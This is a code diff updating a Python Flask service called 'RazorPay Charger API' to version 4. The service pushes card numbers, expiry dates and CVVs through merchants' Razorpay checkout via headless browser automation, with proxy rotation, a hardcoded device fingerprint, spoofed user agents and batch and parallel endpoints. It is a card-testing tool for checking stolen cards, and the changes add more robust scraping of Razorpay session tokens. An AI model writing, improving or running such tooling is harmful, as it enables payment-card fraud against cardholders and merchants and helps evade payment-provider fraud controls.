@@ -2,7 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-RazorPay Charger API — v3 FIXED
+RazorPay Charger API — v4 FIXED
+- session_token extraction: 3 fallbacks (url, body, js)
+- thread-safe playwright (serialized via threaded=False)
+- diagnostic error payloads
+- fast token probe (8s not 55s)
+- supports /razorpay, /razorpay_parallel, /razorpay_batch
 
 Endpoints:
     GET /razorpay?site=&cc=&proxy=&amount=&currency=
@@ -75,7 +80,7 @@ ALLOWED_CURRENCIES = ['USD', 'INR', 'USDT']
 AMOUNT_MIN = 1
 AMOUNT_MAX = 100
 
-DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."
+DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6"
 
 FALLBACK_MERCHANT = {
     'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
@@ -266,7 +271,7 @@ def parse_proxy(proxy_str):
     return None
 
 def extract_clean_response(message):
-    """Extract a clean status label from razorpay responses. Never returns garbage like 'sbx_user'."""
+    """Extract a clean status label from razorpay responses."""
     if message is None:
         return "UNKNOWN_ERROR"
 
@@ -274,7 +279,6 @@ def extract_clean_response(message):
     if not message:
         return "UNKNOWN_ERROR"
 
-    # If it's JSON, try known fields first
     try:
         data = json.loads(message)
         if isinstance(data, dict):
@@ -289,12 +293,10 @@ def extract_clean_response(message):
     except (ValueError, TypeError):
         pass
 
-    # Razorpay-style error codes: UPPER_SNAKE or camelReason
     code_match = re.search(r'\b(PAYMENT_[A-Z_]+|CARD_[A-Z_]+|AUTH_[A-Z_]+|DECLINE_[A-Z_]+|BAD_REQUEST_[A-Z_]+|SERVER_[A-Z_]+|GATEWAY_[A-Z_]+)\b', message)
     if code_match:
         return code_match.group(1)
 
-    # Common razorpay failure keywords we care about
     lowered = message.lower()
     for kw, label in (
         ("authentication failed", "AUTHENTICATION_FAILED"),
@@ -312,10 +314,8 @@ def extract_clean_response(message):
         if kw in lowered:
             return label
 
-    # Last resort: strip known noise tokens, return first meaningful word
     cleaned = re.sub(r'[{}"\':]+', ' ', message).strip()
     cleaned = re.sub(r'\s+', ' ', cleaned)
-    # Reject short garbage tokens like 'sbx_user', 'test', 'prod', single words < 6 chars
     tokens = cleaned.split()
     for tok in tokens:
         if len(tok) >= 6 and not tok.startswith("sbx_"):
@@ -352,6 +352,7 @@ _shared_playwright = None
 _shared_browser = None
 _browser_lock = threading.Lock()
 
+
 def get_shared_browser(proxy_config=None):
     global _shared_playwright, _shared_browser
     with _browser_lock:
@@ -367,11 +368,13 @@ def get_shared_browser(proxy_config=None):
             except Exception:
                 pass
             _shared_playwright = sync_playwright().start()
-            _shared_browser = _shared_playwright.chromium.launch(
-                headless=True,
-                proxy=proxy_config,
-                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
-            )
+            launch_kwargs = {
+                "headless": True,
+                "args": ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
+            }
+            if proxy_config:
+                launch_kwargs["proxy"] = proxy_config
+            _shared_browser = _shared_playwright.chromium.launch(**launch_kwargs)
         return _shared_browser
 
 def close_shared_browser():
@@ -448,18 +451,71 @@ def extract_merchant_from_page(page):
 
 
 def get_session_token(page):
-    """Fetch RazorPay session token. Returns token or None."""
+    """
+    Fetch RazorPay session token with 3 fallbacks + diagnostics.
+    Returns (token_or_None, diag_dict).
+    """
+    diag = {"status": None, "final_url": None, "title": None, "body_head": None, "error": None}
     try:
-        page.goto(
+        resp = page.goto(
             "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
-            timeout=60000
+            timeout=60000,
+            wait_until="domcontentloaded"
         )
-        page.wait_for_url("**/checkout/public*session_token*", timeout=55000)
+        if resp:
+            diag["status"] = resp.status
+        diag["final_url"] = page.url
+
+        # short wait for possible redirect
+        try:
+            page.wait_for_url("**session_token**", timeout=8000)
+        except Exception:
+            pass
+
+        diag["final_url"] = page.url
+        try:
+            diag["title"] = page.title()
+        except Exception:
+            pass
+
+        # fallback 1: URL query
         token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
-        return token
+        if token:
+            return token, diag
+
+        # fallback 2: body regex
+        try:
+            body = page.content()
+            diag["body_head"] = (body or "")[:400]
+            m = re.search(r'"session_token"\s*:\s*"([^"]+)"', body or "")
+            if m:
+                return m.group(1), diag
+        except Exception as e:
+            diag["error"] = f"body read: {e}"
+
+        # fallback 3: JS eval
+        try:
+            token = page.evaluate("""
+                () => {
+                    const qs = new URLSearchParams(window.location.search);
+                    const t = qs.get('session_token');
+                    if (t) return t;
+                    if (window.session_token) return window.session_token;
+                    return null;
+                }
+            """)
+            if token:
+                return token, diag
+        except Exception as e:
+            diag["error"] = f"js eval: {e}"
+
+        logger.warning(f"session token not found. status={diag['status']} url={diag['final_url']}")
+        return None, diag
+
     except Exception as e:
-        logger.warning(f"session token fetch failed: {e}")
-        return None
+        diag["error"] = f"{type(e).__name__}: {e}"
+        logger.warning(f"session token fetch failed: {diag['error']}")
+        return None, diag
 
 
 def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
@@ -515,7 +571,7 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
         if proxy_manager and not proxy_config:
             proxy_config = proxy_manager.get_playwright_proxy()
 
-        # 1. Merchant data — prefer dynamic extraction from the site
+        # 1. Merchant data
         merchant_data = dict(FALLBACK_MERCHANT)
         merchant_source = "fallback"
 
@@ -528,7 +584,6 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
                     probe_page.goto(site_url, timeout=45000, wait_until='networkidle')
                     extracted = extract_merchant_from_page(probe_page)
                     if extracted and extracted.get('keyless_header') and extracted.get('key_id'):
-                        # Only use extracted ids if present; otherwise keep fallback link ids
                         merchant_data['keyless_header'] = extracted['keyless_header']
                         merchant_data['key_id'] = extracted['key_id']
                         if extracted.get('payment_link_id'):
@@ -560,14 +615,14 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
         page.set_extra_http_headers({'User-Agent': FingerprintGenerator.get_user_agent()})
 
         # 2. Session token
-        session_token = get_session_token(page)
+        session_token, token_diag = get_session_token(page)
         if not session_token:
-            result['error'] = 'Failed to get session token'
+            result['error'] = f"Failed to get session token: {json.dumps(token_diag)[:400]}"
             result['status'] = 'session_error'
             result['time'] = round(time.time() - start_time, 2)
             return result
 
-        # 3. Create order — surface the raw error if it fails
+        # 3. Create order
         order_js = """
         async ([pl_id, ppi, amt]) => {
             try {
@@ -1047,7 +1102,7 @@ def razorpay_health():
     return jsonify({
         "status": "online",
         "timestamp": get_full_timestamp(),
-        "version": "3.0",
+        "version": "4.0",
         "browser_status": "connected" if _shared_browser and _shared_browser.is_connected() else "disconnected"
     })
 
